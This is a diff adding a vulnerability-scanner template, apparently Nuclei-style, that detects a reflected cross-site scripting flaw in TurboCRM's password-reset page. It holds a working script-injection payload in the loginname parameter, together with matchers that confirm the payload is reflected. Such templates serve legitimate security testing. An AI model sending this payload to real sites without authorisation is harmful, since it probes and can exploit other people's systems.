@@ -1,0 +1,29 @@
+id: turbocrm-xss
+brief:
+    title: TurboCRM - Cross-Site Scripting
+    by: pikpikcu
+    level: high
+    about: TurboCRM contains a cross-site scripting vulnerability which allows a remote attacker to inject arbitrary JavaScript into the response returned by the application.
+    label:
+        - xss
+        - turbocrm
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/login/forgetpswd.php?loginsys=1&loginname=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
+      signs:
+        - "on": word
+          has:
+            - '"><script>alert(document.domain)</script>'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
